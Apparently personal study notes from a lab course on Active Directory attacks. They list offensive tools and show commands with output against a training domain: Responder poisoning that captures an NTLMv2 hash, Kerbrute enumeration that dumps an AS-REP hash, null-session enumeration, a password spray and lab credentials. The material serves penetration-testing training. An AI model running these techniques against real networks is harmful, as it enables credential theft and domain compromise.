# Introduction to Active Directory Enumeration & Attacks


[SharpView]https://github.com/dmchell/SharpView.git
[PowerView]https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows net* commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting.

[BloodHound](https://github.com/BloodHoundAD/BloodHound)	
Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the SharpHound PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a Neo4j database for graphical analysis of the AD environment.

[SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) 	
The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.

[BloodHound.py 	](https://github.com/fox-it/BloodHound.py)
A Python-based BloodHound ingestor based on the Impacket toolkit. It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis.

[Kerbrute](https://github.com/ropnop/kerbrute) 	
A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing.

[Impacket toolkit](https://github.com/SecureAuthCorp/impacket) 	
A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.

[Responder](https://github.com/lgandx/Responder)
Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.

[Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1) 	
Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.

[C# Inveigh (InveighZero) 	](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh)
The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes.

[rpcinfo 	](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo)
The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The "-p" option is used to specify the target host. For example the command "rpcinfo -p 10.0.0.1" will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges.

[rpcclient 	](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)
A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.

[CrackMapExec (CME) 	](https://github.com/byt3bl33d3r/CrackMapExec)
CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL.

[Rubeus](https://github.com/GhostPack/Rubeus) 	
Rubeus is a C# tool built for Kerberos Abuse.

[GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)
Another Impacket module geared towards finding Service Principal names tied to normal users.

[Hashcat 	](https://hashcat.net/hashcat/)
A great hash cracking and password recovery tool.

[enum4linux ](https://github.com/CiscoCXSecurity/enum4linux)
A tool for enumerating information from Windows and Samba systems.

[enum4linux-ng](https://github.com/cddmp/enum4linux-ng)
A rework of the original Enum4linux tool that works a bit differently.

[ldapsearch 	](https://linux.die.net/man/1/ldapsearch)
Built-in interface for interacting with the LDAP protocol.

[windapsearch 	](https://github.com/ropnop/windapsearch)
A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.

[DomainPasswordSpray.ps1 	](https://github.com/dafthack/DomainPasswordSpray)
DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.

[LAPSToolkit 	](https://github.com/leoloobeek/LAPSToolkit)
The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).

[smbmap ](https://github.com/ShawnDEvans/smbmap)
SMB share enumeration across a domain.

[psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)
Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell.

[wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
Part of the Impacket toolkit, it provides the capability of command execution over WMI.

[Snaffler 	](https://github.com/SnaffCon/Snaffler)
Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.

[smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)
Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.

[setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11))
Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.

[Mimikatz ](https://github.com/ParrotSec/mimikatz)
Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host.

[secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)
Remotely dump SAM and LSA secrets from a host.

[evil-winrm](https://github.com/Hackplayers/evil-winrm)
Provides us with an interactive shell on a host over the WinRM protocol.

[mssqlclient.py ](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)
Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases.

[noPac.py](https://github.com/Ridter/noPac)
Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.

[rpcdump.py 	](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py)
Part of the Impacket toolset, RPC endpoint mapper.

[CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py)
Printnightmare PoC in python.
[
ntlmrelayx.py 	](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)
Part of the Impacket toolset, it performs SMB relay attacks.

[PetitPotam.py 	](https://github.com/topotam/PetitPotam)
PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.

[gettgtpkinit.py 	](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)
Tool for manipulating certificates and TGTs.

[getnthash.py 	](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py)
This tool will use an existing TGT to request a PAC for the current user using U2U.

[adidnsdump ](https://github.com/dirkjanm/adidnsdump)
A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer.

[gpp-decrypt 	](https://github.com/t0thkr1s/gpp-decrypt)
Extracts usernames and passwords from Group Policy preferences files.
[
GetNPUsers.py 	](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking.

[lookupsid.py 	](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py)
SID bruteforcing tool.

[ticketer.py 	](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc.

[raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation.

[Active Directory Explorer 	](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.

[PingCastle](https://www.pingcastle.com/documentation/)
Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on CMMI adapted to AD security).

[Group3r](https://github.com/Group3r/Group3r)
Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).

[ADRecon 	](https://github.com/adrecon/ADRecon)
A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.

Cette commande capture et affiche les paquets réseau sur l’interface ens224
```
keylian zergainoh@htb[/htb]$ sudo tcpdump -i ens224 
```


Lance l’outil Responder sur l’interface ens224 en mode analyse.
```
sudo responder -I ens224 -A
```


 Envoie des paquets ICMP à tous les hôtes dans le sous-réseau 172.16.5.0/23 pour déterminer lesquels sont actifs.
```
keylian zergainoh@htb[/htb]$ fping -asgq 172.16.5.0/23

172.16.5.5
172.16.5.25
172.16.5.50
172.16.5.100
172.16.5.125
172.16.5.200
172.16.5.225
172.16.5.238
172.16.5.240

     510 targets
       9 alive
     501 unreachable
       0 unknown addresses

    2004 timeouts (waiting for response)
    2013 ICMP Echos sent
       9 ICMP Echo Replies received
    2004 other ICMP received

 0.029 ms (min round trip time)
 0.396 ms (avg round trip time)
 0.799 ms (max round trip time)
       15.366 sec (elapsed real time)
```


Déplace l’exécutable kerbrute vers le répertoire /usr/local/bin pour le rendre accessible globalement.
Utilise kerbrute pour énumérer les utilisateurs dans le domaine INLANEFREIGHT.LOCAL en utilisant le contrôleur de domaine 172.16.5.5 et enregistre les utilisateurs valides dans le fichier valid_ad_users.
```
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

2021/11/17 23:01:46 >  Using KDC(s):
2021/11/17 23:01:46 >   172.16.5.5:88
2021/11/17 23:01:46 >  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL
2021/11/17 23:01:46 >  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL
2021/11/17 23:01:46 >  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL
2021/11/17 23:01:50 >  [+] VALID USERNAME:       evalentin@INLANEFREIGHT.LOCAL

 <SNIP>
 
2021/11/17 23:01:51 >  [+] VALID USERNAME:       sgage@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       jshay@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       jhermann@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       whouse@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       emercer@INLANEFREIGHT.LOCAL
2021/11/17 23:01:52 >  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL
2021/11/17 23:01:56 >  Done! Tested 48705 usernames (56 valid) in 9.940 seconds

```
```
ifconfig                                                                                                                                                            
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:30:d9:b2:11  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.225.134  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::f6ff:1908:eacf:8269  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::e79b:94bf:10e9:62b1  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:94:cb:1b  txqueuelen 1000  (Ethernet)
        RX packets 2109  bytes 249773 (243.9 KiB)
        RX errors 0  dropped 100  overruns 0  frame 0
        TX packets 796  bytes 112882 (110.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.225  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::32e6:baa0:e3aa:25da  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:f6:d6  txqueuelen 1000  (Ethernet)
        RX packets 66800  bytes 4451108 (4.2 MiB)
        RX errors 0  dropped 15  overruns 0  frame 0
        TX packets 58933  bytes 4354434 (4.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
sudo responder -I ens224
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [ens224]
    Responder IP               [172.16.5.225]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-6UNMJVF6525]
    Responder Domain Name      [IRTA.LOCAL]
    Responder DCE-RPC Port     [48360]
[!] Error starting TCP server on port 3389, check permissions or other servers running.

[+] Listening for events...                                                                                                                                               

[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[MSSQL] NTLMv2 Client   : 172.16.5.130
[MSSQL] NTLMv2 Username : INLANEFREIGHT\lab_adm
[MSSQL] NTLMv2 Hash     : lab_adm::INLANEFREIGHT:4aefe98c2befd788:193DEA5E4A4EB9F41ABC813C57F52A52:0101000000000000ABEE2646896DDB0186215D3ADAB2B6560000000002000800490052005400410001001E00570049004E002D00360055004E004D004A005600460036003500320035000400140049005200540041002E004C004F00430041004C0003003400570049004E002D00360055004E004D004A005600460036003500320035002E0049005200540041002E004C004F00430041004C000500140049005200540041002E004C004F00430041004C000800300030000000000000000000000000300000E3A522B26D265DC9C530A9F499332569AC2F333F2A78B1254A01CE6E5A29E9AB0A0010000000000000000000000000000000000009003A004D005300530051004C005300760063002F00610063006100640065006D0079002D00650061002D0077006500620030003A0031003400330033000000000000000000 
........................................

```


 Utilise enum4linux pour énumérer les utilisateurs sur l’hôte 172.16.5.5 et filtre les résultats pour afficher uniquement les noms d’utilisateur.
```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

```


Utilise rpcclient pour se connecter à l’hôte 172.16.5.5 sans authentification.
```
rpcclient -U "" -N 172.16.5.5

```


 Utilise crackmapexec pour énumérer les utilisateurs SMB sur l’hôte 172.16.5.5.
```
crackmapexec smb 172.16.5.5 --users
```


Utilise windapsearch pour interroger le contrôleur de domaine à l’adresse IP 172.16.5.5 sans authentification et énumérer les utilisateurs.
```
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```


Utilise kerbrute pour énumérer les utilisateurs dans le domaine inlanefreight.local en utilisant le contrôleur de domaine 172.16.5.5 et le fichier de noms d’utilisateur jsmith.txt
```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```


Utilise crackmapexec pour énumérer les utilisateurs SMB sur l’hôte 172.16.5.5 avec les identifiants htb-student et Academy_student_AD!
```
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```


 Utilise ldapsearch pour interroger le serveur LDAP à 172.16.5.5 et filtre les résultats pour afficher les noms de compte SAM.
```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```


Utilise kerbrute pour énumérer les utilisateurs dans le domaine INLANEFREIGHT en utilisant le contrôleur de domaine INLANEFREIGHT.LOCAL et le fichier de noms d’utilisateur jsmith.txt.
```
kerbrute userenum -d INLANEFREIGHT --dc INLANEFREIGHT.LOCAL jsmith.txt                                                         

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 01/23/25 - Ronnie Flathers @ropnop

2025/01/23 09:20:52 >  Using KDC(s):
2025/01/23 09:20:52 >   INLANEFREIGHT.LOCAL:88

2025/01/23 09:20:52 >  [+] VALID USERNAME:  jjones@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  sbrown@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  jwilson@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  tjohnson@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  bdavis@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  njohnson@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  asanchez@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  dlewis@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  ccruz@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:232d64acb8a1f491a6fd11513d0881c3$1eadf75b0e3e9e6a6618f056a759aea61af09da3bee3e07b0cd00c8b6c1602d20bef71dfacd85468aa32f60a4e27185023472f8b7367faa2c97adbb4c90bd6a413ec54917a62103bedd6049711716cec6a3363b1b6ab6c602aa0f429fbe7dfec1dfe0770c5d32bedff09ae139d64d9abb81b16b3b588b449d8f5d8a3e78556a8f14ccb841025f074ed49402414cb1834efef5fe21dfef361cd0f18946310aaa2c49c6090d54fe16f8afcf480dfe8416271bbee0cfbc03309b4539e2bf839e28d3841202751601c3ffb8616a1eb4acf42a07a69be3c6a15ddbf87bd9f5311100807ed61b84f385ea7d89c47bb0b35f5cd0f93d09c06b76bd2afb877a46c2ca983ba0fff17                                                                                     
2025/01/23 09:20:52 >  [+] VALID USERNAME:  mmorgan@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  rramirez@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  jwallace@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  jsantiago@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  gdavis@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  mrichardson@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  mharrison@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  tgarcia@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  jmay@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  jmontgomery@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  jhopkins@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  dpayne@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  mhicks@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  adunn@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  lmatthews@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  avazquez@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  mlowe@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  jmcdaniel@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  csteele@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  mmullins@INLANEFREIGHT
2025/01/23 09:20:54 >  [+] VALID USERNAME:  mochoa@INLANEFREIGHT
2025/01/23 09:20:54 >  [+] VALID USERNAME:  aslater@INLANEFREIGHT
2025/01/23 09:20:54 >  [+] VALID USERNAME:  ehoffman@INLANEFREIGHT
2025/01/23 09:20:54 >  [+] VALID USERNAME:  ehamilton@INLANEFREIGHT
2025/01/23 09:20:54 >  [+] VALID USERNAME:  cpennington@INLANEFREIGHT
2025/01/23 09:20:55 >  [+] VALID USERNAME:  srosario@INLANEFREIGHT
2025/01/23 09:20:55 >  [+] VALID USERNAME:  lbradford@INLANEFREIGHT
2025/01/23 09:20:55 >  [+] VALID USERNAME:  halvarez@INLANEFREIGHT
2025/01/23 09:20:55 >  [+] VALID USERNAME:  gmccarthy@INLANEFREIGHT
2025/01/23 09:20:55 >  [+] VALID USERNAME:  dbranch@INLANEFREIGHT
2025/01/23 09:20:55 >  [+] VALID USERNAME:  mshoemaker@INLANEFREIGHT
2025/01/23 09:20:56 >  [+] VALID USERNAME:  mholliday@INLANEFREIGHT
2025/01/23 09:20:56 >  [+] VALID USERNAME:  ngriffith@INLANEFREIGHT
2025/01/23 09:20:56 >  [+] VALID USERNAME:  sinman@INLANEFREIGHT
2025/01/23 09:20:56 >  [+] VALID USERNAME:  minman@INLANEFREIGHT
2025/01/23 09:20:56 >  [+] VALID USERNAME:  rhester@INLANEFREIGHT
2025/01/23 09:20:56 >  [+] VALID USERNAME:  rburrows@INLANEFREIGHT
2025/01/23 09:20:57 >  [+] VALID USERNAME:  dpalacios@INLANEFREIGHT
2025/01/23 09:20:58 >  [+] VALID USERNAME:  strent@INLANEFREIGHT
2025/01/23 09:20:58 >  [+] VALID USERNAME:  fanthony@INLANEFREIGHT
2025/01/23 09:20:59 >  [+] VALID USERNAME:  evalentin@INLANEFREIGHT
2025/01/23 09:20:59 >  [+] VALID USERNAME:  sgage@INLANEFREIGHT
2025/01/23 09:20:59 >  [+] VALID USERNAME:  jshay@INLANEFREIGHT
2025/01/23 09:21:00 >  [+] VALID USERNAME:  jhermann@INLANEFREIGHT
2025/01/23 09:21:01 >  [+] VALID USERNAME:  whouse@INLANEFREIGHT
2025/01/23 09:21:01 >  [+] VALID USERNAME:  emercer@INLANEFREIGHT
2025/01/23 09:21:02 >  [+] VALID USERNAME:  wshepherd@INLANEFREIGHT
2025/01/23 09:21:03 >  Done! Tested 48705 usernames (56 valid) in 11.225 seconds
```


Cette commande utilise un script PowerShell pour effectuer une attaque de pulvérisation de mots de passe sur un domaine Active Directory.
```
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
```


Cette commande PowerShell récupère l’état des différentes fonctionnalités de sécurité sur un ordinateur, en particulier celles liées à Windows Defender. Utile pour vérifier la configuration actuelle de Windows Defender, ce qui peut aider à comprendre quelles protections sont activées ou désactivées.
```
PS C:\htb> Get-MpComputerStatus

AMEngineVersion                 : 1.1.17400.5
AMProductVersion                : 4.10.14393.0
AMServiceEnabled                : True
AMServiceVersion                : 4.10.14393.0
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 9/2/2020 11:31:50 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
AntivirusSignatureAge           : 1
AntivirusSignatureLastUpdated   : 9/2/2020 11:31:51 AM
AntivirusSignatureVersion       : 1.323.392.0
BehaviorMonitorEnabled          : False
ComputerID                      : 07D23A51-F83F-4651-B9ED-110FF2B83A9C
ComputerState                   : 0
FullScanAge                     : 4294967295
FullScanEndTime                 :
FullScanStartTime               :
IoavProtectionEnabled           : False
LastFullScanSource              : 0
LastQuickScanSource             : 2
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
NISSignatureAge                 : 4294967295
NISSignatureLastUpdated         :
NISSignatureVersion             : 0.0.0.0
OnAccessProtectionEnabled       : False
QuickScanAge                    : 0
QuickScanEndTime                : 9/3/2020 12:50:45 AM
QuickScanStartTime              : 9/3/2020 12:49:49 AM
RealTimeProtectionEnabled       : True
RealTimeScanDirection           : 0
PSComputerName                  :
```


Cette commande PowerShell récupère la politique AppLocker effective et affiche les collections de règles.
Utile pour vérifier les règles AppLocker en vigueur sur un système, ce qui peut aider à comprendre quelles applications sont autorisées ou bloquées.
```
PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PathConditions      : {%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 3d57af4a-6cf8-4e5b-acfc-c2c2956061fa
Name                : Block PowerShell
Description         : Blocks Domain Users from using PowerShell on workstations
UserOrGroupSid      : S-1-5-21-2974783224-3764228556-2640795941-513
Action              : Deny

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 921cc481-6e17-4653-8f75-050b80acca20
Name                : (Default Rule) All files located in the Program Files folder
Description         : Allows members of the Everyone group to run applications that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
Name                : (Default Rule) All files located in the Windows folder
Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : fd686d83-a829-4351-8ff4-27c7de5755d2
Name                : (Default Rule) All files
Description         : Allows members of the local Administrators group to run all applications.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

```


Cette commande PowerShell affiche le mode de langage actuel de la session.
Utile pour vérifier si la session PowerShell est en mode restreint ou complet, ce qui peut affecter l’exécution des scripts.
```
PS C:\htb> $ExecutionContext.SessionState.LanguageMode

ConstrainedLanguage
```


Cette commande PowerShell recherche dans toutes les unités d’organisation (OU) pour identifier les groupes Active Directory (AD) qui ont des droits de lecture délégués sur l’attribut ms-Mcs-AdmPwd. Utile pour vérifier quelles entités ont accès aux mots de passe gérés par LAPS (Local Administrator Password Solution), ce qui peut aider à comprendre les permissions de sécurité en vigueur sur un système.
```
PS C:\htb> Find-LAPSDelegatedGroups

OrgUnit                                             Delegated Groups
-------                                             ----------------
OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\Domain Admins
OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\LAPS Admins
OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\Domain Admins
OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\LAPS Admins
OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
